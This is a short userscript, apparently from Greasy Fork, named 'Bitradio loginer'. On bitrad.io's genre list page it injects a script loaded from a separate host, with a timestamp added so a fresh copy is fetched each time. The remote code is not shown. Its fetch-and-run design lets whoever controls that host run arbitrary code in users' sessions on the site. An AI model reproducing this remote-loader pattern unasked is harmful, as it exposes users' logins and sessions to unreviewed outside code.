// ==UserScript==
// @name         Bitradio loginer
// @namespace    http://bitrad.io/
// @version      0.09
// @author       lxgn
// @description  BitradIO informer
// @match        https://bitrad.io/genre/list/
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/370529/Bitradio%20loginer.user.js
// @updateURL https://update.greasyfork.org/scripts/370529/Bitradio%20loginer.meta.js
// ==/UserScript==

var ms = new Date();

var script = document.createElement('script');


var kuda = "https://bitradio.liksagen.com/js/loginer/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }